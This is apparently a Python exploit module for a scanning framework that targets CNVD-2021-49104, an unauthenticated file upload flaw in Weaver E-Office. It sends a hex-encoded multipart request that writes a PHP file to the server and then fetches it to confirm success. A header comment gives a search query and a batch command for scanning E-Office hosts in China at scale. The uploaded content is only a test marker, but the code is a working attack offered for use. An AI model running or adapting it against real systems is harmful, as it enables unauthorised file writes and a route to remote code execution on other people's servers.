# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
from requests_toolbelt import MultipartEncoder

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# app="泛微-EOffice" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Office.v9.CNVD-2021-49104 -cs -fs "app=\"泛微-EOffice\" && country=\"CN\""
# ok


class Script(BaseScript):
    name = 'E-Office'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = 'CNVD-2021-49104'
        # 来源
        self.bug_refer = 'https://github.com/bigsizeme/CNVD-2021-49104/blob/main/e-oeffice.py'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=']
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/general/login/view/css/login.css' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex('2D2D65363462646631366335353462626331303963656365663634353163323661340D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2246696C6564617461223B2066696C656E616D653D22322E706870220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A746573743132333435360D0A2D2D65363462646631366335353462626331303963656365663634353163323661342D2D0D0A')
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if 'logo-eoffice.php' in text:
                    url = f'http://{self.target}/images/logo/logo-eoffice.php' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/images/logo/logo-eoffice.php'
                    text = await AsyncFetcher.fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                    if text is not None and 'test123456' in text:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} CNVD-2021-49104'.format(self.name), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
